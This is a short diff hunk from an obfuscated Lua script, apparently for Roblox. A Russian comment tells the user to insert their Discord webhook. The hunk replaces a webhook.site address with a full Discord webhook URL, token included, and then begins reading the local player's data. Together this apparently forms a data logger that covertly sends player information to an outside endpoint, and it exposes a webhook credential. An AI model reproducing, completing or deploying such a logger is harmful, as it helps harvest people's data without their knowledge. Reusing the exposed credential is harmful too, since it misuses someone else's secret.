@@ -4,7 +4,7 @@ moonsec:Obfuscate(function()
 
     -- === ВАЖНО ===
     -- Укажи свой вебхук Discord
-    local webhookURL = "https://webhook.site/d3261816-b74e-4727-8deb-df5cedacd22f"
+    local webhookURL = "https://discord.com/api/webhooks/1339562627269132298/i-0WV49Q09N4Dj7aCjRkk5FeNoMAlT8_5Fe0d15rwGRl_dLvvgFUumC5_Tmyh2lEn6lX"
 
     -- Получаем данные об игроке
     local player = game.Players.LocalPlayer
